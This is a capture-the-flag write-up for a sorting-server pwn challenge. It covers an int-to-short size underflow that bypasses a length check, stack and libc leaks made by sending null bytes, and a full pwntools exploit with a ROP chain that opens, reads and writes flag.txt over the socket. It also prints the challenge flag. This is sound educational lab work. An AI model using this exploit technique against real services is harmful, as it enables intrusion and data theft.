![[Screenshot_20241015_153312.png]]

---
### TL;DR:

1. Exploit an integer underflow caused by casting an `int` variable as `short` to bypass the 100-element input limit and cause a buffer overflow.
2. Leak the stack by sending null bytes as inputs then use a known address from the stack to leak libc.
3. Craft a ROP chain that reuses the file descriptor used by the socket connection to read and print the contents of `flag.txt` file to client-side.
---
### Overview

For this challenge, we were provided with a zip file containing the following:
```
.
├── Dockerfile
├── flag.txt
├── ld-linux-x86-64.so.2
├── libc.so.6
├── nsjail.cfg
└── sortingserver
```

We started by running `pwn checksec` on the binary to assess its security features:
![[Screenshot_20241015_153510.png]]

As seen, the binary has stack canaries, NX, and PIE enabled—important considerations for our exploitation.

---
### Initial Interaction with the Program

Running the binary revealed that it sets up a server listening on port 1337 and accepts TCP connections:
![[Screenshot_20241015_153728.png]]
![[Screenshot_20241015_153833.png]]

When we connect to the service, we’re asked to input a number of elements, followed by the elements themselves, which are sorted and returned:
![[Screenshot_20241015_154035.png]]

---
### Dissecting the Code

At first glance, this seems like a simple sorting server. However, further analysis of the binary in Ghidra reveals deeper vulnerabilities.
```c
undefined8 main(void)

{
  int iVar1;
  __pid_t _Var2;
  long in_FS_OFFSET;
  socklen_t local_30;
  int local_2c;
  sockaddr local_28;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  FUN_00101331();
  local_30 = 0x10;
  local_2c = socket(2,1,0);
  if (local_2c == 0) {
    perror("Socket failed");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_28.sa_family = 2;
  local_28.sa_data[2] = '\0';
  local_28.sa_data[3] = '\0';
  local_28.sa_data[4] = '\0';
  local_28.sa_data[5] = '\0';
  local_28.sa_data._0_2_ = htons(0x539);
  iVar1 = bind(local_2c,&local_28,0x10);
  if (iVar1 < 0) {
    perror("Bind failed");
    close(local_2c);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = listen(local_2c,3);
  if (iVar1 < 0) {
    perror("Listen failed");
    close(local_2c);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("Server is listening on port %d...\n",0x539);
  while( true ) {
    sockfd = accept(local_2c,&local_28,&local_30);
    if (sockfd < 0) {
      perror("Accept failed");
      close(local_2c);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    _Var2 = fork();
    if (_Var2 == 0) break;
    puts("Connected to client.");
    close(sockfd);
  }
  serve();
  write(sockfd,"\nThank you for using our service! hope to see you again soon.\n",0x3e);
  close(sockfd);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

The program's main function creates a TCP socket, forks a child process for each incoming connection, and then calls the `serve()` function to handle the client's requests.
```c
undefined8 serve(void)

{
  int size;
  uint element;
  size_t __n;
  long in_FS_OFFSET;
  short i;
  short j;
  uint arr [100];
  char size_buf [24];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  write(sockfd,"Welcome to sorting server, server to sort your numbers efficiently!\n",0x45);
  write(sockfd,"Enter number of elements: ",0x1a);
  read(sockfd,size_buf,0x18);
  size = atoi(size_buf);
  if (100 < size) {
    write(sockfd,"Sorry length more than 100 are currently not supported!\n",0x38);
    close(sockfd);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  write(sockfd,"Enter the numbers: \n",0x14);
  for (i = 0; i < (short)size; i = i + 1) {
    read(sockfd,size_buf,0x18);
    if (size_buf[0] != '\0') {
      element = atoi(size_buf);
      arr[(int)i] = element;
    }
  }
  sort((int *)arr,size);
  write(sockfd,"Result: ",8);
  for (j = 0; j < (short)size; j = j + 1) {
    sprintf(size_buf,"%d ",(ulong)arr[(int)j]);
    __n = strlen(size_buf);
    write(sockfd,size_buf,__n);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Here, we notice two things:
1. The array `arr` can hold a maximum of 100 integers.
2. The program checks that the number of elements (`size`) is ≤ 100 before proceeding.

```c
void sort(int *arr,int size)

{
  int i;
  int min_index;
  int j;
  int temp;
  
  for (i = 0; i < size + -1; i = i + 1) {
    min_index = i;
    j = i;
    while (j = j + 1, j < size) {
      if (arr[j] < arr[min_index]) {
        min_index = j;
      }
    }
    if (min_index != i) {
      temp = arr[min_index];
      arr[min_index] = arr[i];
      arr[i] = temp;
    }
  }
  return;
}
```

In this sorting function, nothing seems to be out of ordinary. 

---
### Integer Underflow Vulnerability

Let's review the `serve()` function again because that's where most of our input are processed.
```c
write(sockfd,"Welcome to sorting server, server to sort your numbers efficiently!\n",0x45);
write(sockfd,"Enter number of elements: ",0x1a);
read(sockfd,size_buf,0x18);
size = atoi(size_buf);
if (100 < size) {
	write(sockfd,"Sorry length more than 100 are currently not supported!\n",0x38);
	close(sockfd);
					/* WARNING: Subroutine does not return */
	exit(0);
}
```

Interestingly, the program does not check for negative values when asking for the number of elements. If we input a negative number that is beyond the integer range of `short`, it is becomes a positive number due to an **integer underflow** when casting `size` from `int` to `short`. For example, inputting `-65536` results in `size = 0` due to wrapping.

By using a size like `-65536 + n`, where `n` is the actual number of elements we want to input, we can bypass the 100-element limit and achieve a **buffer overflow**.
![[Screenshot_20241015_162736.png]]

There's also another consequence of inputting a negative size: the `sort()` function does not sort the elements anymore since, unlike the `for` loop that contains the vulnerability, the loops in the sort function does not cast the `size` variable into `short`.

---
### Leaking the Stack

Now that we have a buffer overflow vulnerability, the next challenge is bypassing the stack canary. Fortunately, there’s another subtle vulnerability in the input loop that not only allows us to leak values in the stack, but also cause a buffer overflow without overwriting the stack canary. Let's look at the vulnerable loop once again:
```c
  for (i = 0; i < (short)size; i = i + 1) {
    read(sockfd,size_buf,0x18);
    if (size_buf[0] != '\0') {
      element = atoi(size_buf);
      arr[(int)i] = element;
    }
  }
```

If we send a **null byte** (`\x00`) as input, the check `size_buf[0] != '\0'` fails, meaning no element is written to the array for that iteration. This allows us to effectively skip writing to the array while still traversing the stack.

Using `pwntools`, I sent null bytes for all input elements:
```python
def send_size(n: int):
	base = -65536
	n += base
	io.sendlineafter(b"Enter number of elements: ", str(n).encode())


def send_null():
	time.sleep(0.03)
	io.sendline(b'\x00')


n = 100
send_size(n)

for i in range(n):
	send_null()
```

This allowed us to leak values in the stack:
![[Screenshot_20241016_073335.png]]

---
### Leaking libc

With the leaked stack addresses, we can extract an address that points to a variable or code in libc by searching for a known offset within the stack values. Using the following code, I converted the leaked values to hexadecimal to make the search easier:
```python
def leak_stack(n):
	io = conn()

	send_size(io, n)

	for i in range(n):
		send_null(io)

	io.recvuntil(b"Result: ")
	leak = io.recvline().decode().strip().split(' ')
	io.close()

	values = [int(s) & 0xffffffff for s in leak]
	qwords = []
	for i in range(0, len(values), 2):
		lo = values[i]
		hi = values[i + 1]
		qword = (hi << 32) | lo
		qwords.append(qword)
		log.info(f"[{i // 2}] Leaked at offset {hex(i * 4)}: {hex(qword)}")

	return qwords


qwords = leak_stack(200)
```

This gives us a more readable output:
![[Screenshot_20241017_075655.png]]

There are a few interesting values in this leak
- The value leaked at `0x1c8` is the return address of the `serve()` function
- The value leaked at `0x1f8` is the value of the stack canary
- The value leaked at `0x250` is the address of a `__libc_start_main+133` 

![[Screenshot_20241017_080034.png]]

However, I will only be using the libc leak for our exploitation.

---
### Crafting the ROP Chain

With the libc base known, the next step is to finally exploit the binary. In my case, I initially tried spawning a shell using a simple `execve` ROP chain, but it didn't work because the shell actually spawns on the server, not on the client. So what I did is to just print the contents of the `flag.txt` file that's in the same directory as the binary based on the `Dockerfile` provided:
![[Screenshot_20241016_082908.png]]

To better understand why we are unable to spawn a shell using a simple `execve` ROP chain, let's analyze how the server interacts with us:
![[Screenshot_20241016_083111.png]]
![[Screenshot_20241016_083030.png]]
In calling the `read()` and `write()` functions, the binary uses the `sockfd` as the file descriptor which is returned by the `accept()` call, which is a function that returns a new `sockfd` everytime it accepts a socket connection. This means that if we ever want to print an output to our terminal on client-side, we have to use the corresponding `sockfd` for our connection when calling the `write()` function. 

Luckily for us, we can just reuse the `sockfd` used by the `write()` and `read()` function calls in the `serve()` function prior to returning to our ROP chain. Through dynamic analysis using GDB-GEF, I discovered that the RDI register which contains the value for `sockfd` is not overwritten by any preceding code. To make sure we don't lose this value during our function calls in our ROP chain, we can save this value by writing it to some address in `.bss` section or by copying it to other registers.  

All things considered, my final ROP chain looked like this:
```python
rop_chain = flat(
	XCHG_EAX_EDI,
	XCHG_EAX_EBX,

	POP_RSI, FLAG_PATH_ADDR,
	POP_RDX, FLAG_PATH_STR,
	MOV_QWORD_RSI_RDX,

	POP_RDI, FLAG_PATH_ADDR,
	POP_RSI, 0x0,
	OPEN_FUNC,

	XCHG_EAX_EDI,
	POP_RSI, FLAG_CONTENT_ADDR,
	POP_RDX, 0x40,
	READ_FUNC,

	XCHG_EAX_EBX,
	XCHG_EAX_EDI,
	POP_RSI, FLAG_CONTENT_ADDR,
	POP_RDX, 0x40,
	WRITE_FUNC,
)
```

This chain first saves the content of the RDI register to the RBX register. Then using a `mov` instruction, I wrote the filepath of the file that we want to read, which is `flag.txt`, then proceeded to call the `open`, `read`, and `write` functions to print the contents of the flag to my connection using the saved `sockfd` value in the RBX register.

My final exploit code looks like this:
```python
from pwn import *
import time

exe = ELF("./sortingserver")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

HOST = "pwn.1nf1n1ty.team"
PORT = 30648

def conn():
    global HOST, PORT

    if args.REMOTE:
        io = remote(HOST, PORT)
    else:
        io = remote("localhost", 1337)
        
    return io


def main():

    def send_input(io, s):
        wait_time = 0.03 if not args.REMOTE else 0.5
        time.sleep(wait_time)
        io.sendline(s)


    def send_size(io, n: int):
        base = -65536
        n += base

        log.info(f"Sending size: {n}")
        io.sendlineafter(b"Enter number of elements: ", str(n).encode())


    def send_null(io):
        log.info(f"Sending null byte...")
        send_input(io, b'\x00')


    def leak_stack(max_offset):
        io = conn()

        n = (max_offset // 4) + 2
        send_size(io, n)

        for i in range(n):
            send_null(io)

        io.recvuntil(b"Result: ")
        leak = io.recvline().decode().strip().split(' ')
        io.close()

        values = [int(s) & 0xffffffff for s in leak]
        qwords = []
        for i in range(0, len(values), 2):
            lo = values[i]
            hi = values[i + 1]
            qword = (hi << 32) | lo
            qwords.append(qword)
            log.info(f"[{i // 2}] Leaked at offset {hex(i * 4)}: {hex(qword)}")

        return qwords


    def write_payload(io, payload):
        RET_OFFSET = 0x1c8
        nulls = RET_OFFSET // 4
        payload_dwords = len(payload) // 4

        total = nulls + payload_dwords

        send_size(io, total)

        for i in range(nulls):
            send_null(io)

        for i in range(0, len(payload), 4):
            chunk = payload[i:i + 4]
            num = u32(chunk)

            log.info(f"Sending payload chunk: {chunk}")
            send_input(io, str(num).encode())


    # LEAK LIBC ADDRESS
    qwords = leak_stack(0x2a8)

    libc_start_main = qwords[85] - 133
    libc.address = libc_start_main - libc.sym['__libc_start_main']

    log.success(f"Leaked libc address: {hex(libc.address)}")


    # EXPLOITATION PHASE
    io = conn()

    OPEN_FUNC = libc.sym['open']
    READ_FUNC = libc.sym['read']
    WRITE_FUNC = libc.sym['write']
    POP_RDI = libc.address + 0x0000000000028215
    POP_RSI = libc.address + 0x0000000000029b29
    POP_RDX = libc.address + 0x00000000001085ad
    XCHG_EAX_EDI = libc.address + 0x000000000004bd3a
    XCHG_EAX_EBX = libc.address + 0x00000000000b124f
    MOV_QWORD_RSI_RDX = libc.address + 0x000000000004f862
    FLAG_PATH_STR = u64(b'flag.txt')
    FLAG_PATH_ADDR = libc.bss(0x800)
    FLAG_CONTENT_ADDR = libc.bss(0x900)

    rop_chain = flat(
        XCHG_EAX_EDI,
        XCHG_EAX_EBX,

        POP_RSI, FLAG_PATH_ADDR,
        POP_RDX, FLAG_PATH_STR,
        MOV_QWORD_RSI_RDX,

        POP_RDI, FLAG_PATH_ADDR,
        POP_RSI, 0x0,
        OPEN_FUNC,

        XCHG_EAX_EDI,
        POP_RSI, FLAG_CONTENT_ADDR,
        POP_RDX, 0x40,
        READ_FUNC,

        XCHG_EAX_EBX,
        XCHG_EAX_EDI,
        POP_RSI, FLAG_CONTENT_ADDR,
        POP_RDX, 0x40,
        WRITE_FUNC,
    )

    write_payload(io, rop_chain)

    io.interactive()


if __name__ == "__main__":
    main()
```

After running the exploit for a few minutes, we get this:
![[Screenshot_20241017_000627.png]]

Flag: `ironCTF{W3lc0m3_T0_R3m0te_pwn1ng!!!}`


